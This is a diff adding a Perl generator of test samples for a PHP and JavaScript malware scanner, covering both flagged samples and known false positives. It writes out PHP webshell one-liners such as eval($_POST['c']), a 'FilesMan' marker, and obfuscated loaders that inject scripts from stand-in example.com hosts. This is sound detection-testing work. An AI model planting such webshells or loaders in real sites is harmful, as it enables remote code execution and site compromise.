@@ -1,0 +1,118 @@
+#!/usr/bin/perl
+# Generator for tests/samples: synthetic, harmless samples (only *.example.com
+# domains, nothing is ever executed). Add a sample here, then:
+#   perl tests/make-samples.pl tests/samples && bash tests/run.sh --update
+# and review the expected.txt diff line by line before committing.
+use strict; use warnings; use MIME::Base64; use File::Path qw(make_path); use File::Basename;
+my $D = shift or die "usage: $0 DIR\n";
+sub w { my ($p, $c) = @_; my $f = "$D/$p"; make_path(dirname($f));
+        open my $h, '>', $f or die "$f: $!"; print $h $c; close $h }
+sub hex_esc { join '', map { sprintf '\\x%02x', ord } split //, shift }
+sub shift_s { my ($s, $n) = @_; join '', map { chr(ord($_) + $n) } split //, $s }
+sub codes   { join ',', map { ord } split //, shift }
+sub pct     { join '', map { sprintf '%%%02x', ord } split //, shift }
+
+my $H = "/* fixed-malscan test sample - synthetic, harmless (example.com only) */\n";
+my $P = "<?php\n// fixed-malscan test sample - synthetic, harmless (example.com only)\n";
+
+# ---------------- must be flagged ----------------
+w('malicious/js/shifted-url.js', $H .
+  'var s="' . shift_s('https://shift.example.com/x.js', 5) . '",o="";' .
+  'for(var i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)-5);' . "\n");
+w('malicious/js/fromcharcode-long.js', $H .
+  'document.write(String.fromCharCode(' . codes('<script src="https://fcc.example.com/a.js"></script>') . "));\n");
+w('malicious/js/fromcharcode-short.js', $H .
+  'var k=String.fromCharCode(' . codes('cookie=1') . ");\n");
+w('malicious/js/hex-http.js', $H .
+  'var u="' . hex_esc('https') . '://hex.example.com/p.js";' . "\n");
+w('malicious/js/eval-atob.js', $H .
+  "eval(atob('" . encode_base64('document.write("<script src=//b64.example.com/a.js></script>")', '') . "'));\n");
+w('malicious/js/unescape-blob.js', $H .
+  "document.write(unescape('" . pct('<script src="//pct.example.com/a.js"></script>') . "'));\n");
+w('malicious/js/packer.js', $H .
+  "eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0 1',2,2,'var|x'.split('|'),0,{}))\n");
+w('malicious/js/obfuscator.js', $H .
+  "var _0x1a2b3c=['log'];(function(_0x4d5e6f,_0x7a8b9c){_0x4d5e6f[_0x7a8b9c]})(_0x1a2b3c,_0x2b3c4d);\n");
+w('malicious/php/eval-chain.php', $P .
+  "eval(gzinflate(base64_decode('" . encode_base64('placeholder payload, not compressed', '') . "')));\n");
+w('malicious/php/hex-varvar.php', $P .
+  '${"' . hex_esc('GLOBALS') . '"}["a"] = "b";' . "\n");
+w('malicious/php/char-assembly.php', $P .
+  '$f = $t["k"][77].$t["k"][40].$t["k"][12].$t["k"][3];' . "\n");
+w('malicious/php/input-exec.php', $P . 'eval($_POST["c"]);' . "\n");
+w('malicious/php/webshell-marker.php', $P . '$auth = "FilesMan";' . "\n");
+w('malicious/php/hex-blob.php', $P .
+  '$a = "' . hex_esc('eval(base64_decode($_POST["cmd"]));//pad') . '";' . "\n");
+w('malicious/php/hex-blob-one-repeat.php', $P .
+  '$t = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUe') . '";' . "\n");
+w('malicious/php/hex-blob-table-plus-injection.php', $P .
+  '$t = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n" .
+  '$a = "' . hex_esc('eval(base64_decode($_POST["cmd"]));//pad') . '";' . "\n");
+w('malicious/php/b64url-variable.php', $P .
+  '$u = \'' . encode_base64('https://b64url.example.com/payload.txt', '') . "';\n" .
+  'echo file_get_contents(base64_decode($u));' . "\n");
+(my $safe = encode_base64('https://b64safe.example.com/??>>x.js', '')) =~ tr{+/}{-_};
+w('malicious/js/b64url-urlsafe.js', $H .
+  'var u="' . $safe . '";var s=document.createElement("script");s.src=atob(u.replace(/-/g,"+").replace(/_/g,"/"));' . "\n");
+w('malicious/js/b64url-http.js', $H .
+  "var cfg={src:'" . encode_base64('http://b64http.example.com/i.js', '') . "'};\n");
+# look-alikes of the content (rate_/classify_) FP rules: must still be reported
+w('malicious/php/char-assembly-almost-sequence.php', $P .
+  '$f = $t[10].$t[11].$t[12].$t[14];' . "\n");
+w('malicious/php/b64-gif-with-php.php', $P .
+  "\$x = base64_decode('" . encode_base64('GIF89a<?php eval($_POST[1]); ?>', '') . "');\n");
+w('malicious/php/b64-function-name.php', $P .
+  "\$f = base64_decode('" . encode_base64('file_put_contents', '') . "');\n");
+w('backups/shell.php.dist', "<?php eval(\$_POST['c']); ?>\n");
+my $arith = 'function a(t){return t.charCodeAt(0)-48}' .
+  'function b(c){return c.charCodeAt(0)-"A".charCodeAt(0)+10}' .
+  'function c(t,s){return t[s].charCodeAt(1)+1===t[s+1].charCodeAt(1)}' .
+  'function d(o){return 95===o.id.charCodeAt(o.id.lastIndexOf("/")+1)}' .
+  'function e(t,i){for(var n=t[i-1].charCodeAt(0)+1,r=t[i+1].charCodeAt(0)-1,a=n,d=[];a<=r;)d.push(String.fromCharCode(a)),a++;return d}';
+w('malicious/js/shift-via-variable.js', $H .
+  'var s="x",o="";for(var i=0;i<s.length;i++){var c=s.charCodeAt(i)-5;o+=String.fromCharCode(c)}' . "\n");
+w('malicious/js/shift-one-via-variable.js', $H .
+  'var s="x",o="";for(var i=0;i<s.length;i++){var c=s[i].charCodeAt(0)-1;o+=String.fromCharCode(c)}' . "\n");
+w('malicious/js/char-maths-plus-shift.js', $H . $arith . "\n" .
+  'var s="x",o="";for(var i=0;i<s.length;i++){var c=s.charCodeAt(i)^7;o+=String.fromCharCode(c)}' . "\n");
+# path-allowlist blind-spot tests: injection in/next to an allowlisted file
+my $reveal = 'const d=e=>{try{e=decodeURIComponent(e);let t="";for(let r=0;r<e.length;r++)'
+           . 't+=String.fromCharCode(e.charCodeAt(r)-1);return atob(t)}catch(t){return e}};';
+w('wp-content/plugins/superb-blocks/assets/js/injected.js', $H .
+  'var s="' . shift_s('https://superb.example.com/x.js', 5) . '",o="";' .
+  'for(var i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)-5);' . "\n");
+w('wp-content/plugins/superb-blocks/assets/js/dynamic-blocks/reveal-button.js', $H . $reveal . "\n" .
+  'var s="' . shift_s('https://reveal.example.com/x.js', 5) . "\";\n");
+w('wp-content/uploads/2026/10/cache.php', $P . 'echo "uploaded code";' . "\n");
+w('backups/wp-config.php.bak', $P . "define('DB_USER', 'x'); define('DB_PASSWORD', 'x');\n");
+w('backups/wp-config-old.txt', "no credentials here\n");
+w('backups/old.php.bak', $P . "echo 1;\n");
+w('backups/empty.php.bak', '');
+
+# ---------------- known false positives: must stay quiet/ignored ----------------
+w('legit/php/hex-lookup-table.php', $P .
+  'static $ASCII = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n");
+w('legit/php/sodium-binary-constants.php', $P .
+  '$k = "\xed\xd3\xf5\x5c\x1a\x63\x12\x58\xd6\x9c\xf7\xa2\xde\xf9\xde\x14\x00\x00\x00\x00";' . "\n");
+w('legit/php/base64-variable.php', $P . '$d = base64_decode($input);' . "\n");
+w('legit/js/svg-data-uri.js', $H .
+  'var icon="data:image/svg+xml;base64,' .
+  encode_base64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"></svg>', '') . "\";\n");
+w('legit/php/b64-scheme-only.php', $P . '$p = \'aHR0cHM6Ly8=\';' . "\n");
+w('legit/php/array-copy-in-order.php', $P .
+  '$col = "6" . $sh["col"][1] . $sh["col"][2] . $sh["col"][3] . $sh["col"][4] . chr(100);' . "\n");
+w('legit/php/tracking-pixel.php', $P .
+  "echo base64_decode('R0lGODlhAQABAJAAAP8AAAAAACH5BAUQAAAALAAAAAABAAEAAAICBAEAOw==');\n");
+w('legit/php/api-client-id.php', $P .
+  "\$id = base64_decode('" . encode_base64('k3x9q2mzt7w4p8v', '') . "');\n");
+w('legit/php/Template.php.in', $P . "class Example_Template { public \$name = 'Template'; }\n");
+w('legit/php/.php_cs.dist', $P . "return PhpCsFixer\\Config::create()->setRules(['\@PSR2' => true]);\n");
+w('legit/php/helper.php_example', $P . "/* Plugin Name: Example Helper */\nadd_filter('x', '__return_true');\n");
+w('legit/js/char-maths.js', $H . $arith . "\n");
+w('legit/js/rot13.js', $H .
+  'function rot13(s){return s.replace(/[a-z]/gi,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26)})}' . "\n");
+w('legit/js/luhn.js', $H .
+  'function v(n){var s=0;for(var i=0;i<n.length;i++){s+=n.charCodeAt(i)-48}return s%10==0}' . "\n");
+w('wp-content/plugins/superb-helper-pro/assets/js/premium/premium-reveal-button.js', $H . $reveal . "\n");
+w('wp-content/uploads/placeholder/index.php', "<?php\n// Silence is golden.\n");
+w('backups/saved-page.php@id=1.htm', "<!doctype html><html><body>saved page</body></html>\n");
